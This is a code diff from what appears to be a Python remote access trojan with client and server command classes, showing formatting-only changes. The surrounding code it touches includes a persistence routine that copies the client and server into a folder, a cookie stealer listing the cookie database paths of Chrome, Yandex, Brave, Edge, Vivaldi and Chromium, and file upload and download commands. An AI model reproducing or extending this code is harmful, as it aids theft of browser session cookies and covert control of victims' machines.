@@ -567,9 +567,10 @@ class AddPersistence(DoubleCommand):
         shutil.copy("./server.py", f"{folder_path}/server.py")
         shutil.copy("./client.py", f"{folder_path}/client.py")
 
-        with open(f"{folder_path}/client.py", "r+") as client_file, open(
-            f"{folder_path}/server.py", "r+"
-        ) as server_file:
+        with (
+            open(f"{folder_path}/client.py", "r+") as client_file,
+            open(f"{folder_path}/server.py", "r+") as server_file,
+        ):
             client_file_contents = client_file.read()
             server_file_contents = server_file.read()
             client_file.seek(0)
@@ -793,12 +794,12 @@ class CookieStealer(DoubleCommand):
         paths: dict[str, str] = {}
         if len(LOCAL) > 0:
             paths["chrome"] = f"{LOCAL}/Google/Chrome/User Data/Default/Network/Cookies"
-            paths[
-                "yandex"
-            ] = f"{LOCAL}/Yandex/YandexBrowser/User Data/Network/Default/Cookies"
-            paths[
-                "brave"
-            ] = f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies"
+            paths["yandex"] = (
+                f"{LOCAL}/Yandex/YandexBrowser/User Data/Network/Default/Cookies"
+            )
+            paths["brave"] = (
+                f"{LOCAL}/BraveSoftware/Brave-Browser/User Data/Default/Network/Cookies"
+            )
             paths["edge"] = f"{LOCAL}/Microsoft/Edge/User Data/Default/Network/Cookies"
             paths["vivaldi"] = f"{LOCAL}/Vivaldi/User Data/Default/Network/Cookies"
             paths["chromium"] = f"{LOCAL}/Chromium/User Data/Default/Network/Cookies"
@@ -949,7 +950,7 @@ class UploadItem(DoubleCommand):
             with open(params[0], "rb") as in_file:
                 item_contents = in_file.read()
         else:
-            item_contents = UploadItem.compress_folder(params[0])  # type: ignore
+            item_contents = UploadItem.compress_folder(params[0])
 
         try:
             if item_type == "file":
@@ -1058,7 +1059,7 @@ class DownloadItem(DoubleCommand):
                 with open(source_path, "rb") as in_file:
                     item_contents = in_file.read()
             else:
-                item_contents = DownloadItem.compress_folder(source_path)  # type: ignore
+                item_contents = DownloadItem.compress_folder(source_path)
         except PermissionError:
             success_indicator = b"p"
             return
@@ -2033,7 +2034,7 @@ class PlaySound(DoubleCommand):
         with open(sound_file, "wb") as sound_file_fd:
             sound_file_fd.write(sound_contents)
 
-        multiprocessing.Process(target=PlaySound.play_sound, args=[sound_file], name="Play sound").start()  # type: ignore
+        multiprocessing.Process(target=PlaySound.play_sound, args=[sound_file], name="Play sound").start()
 
     @staticmethod
     def server_side(client: Client, params: tuple) -> CommandResult:
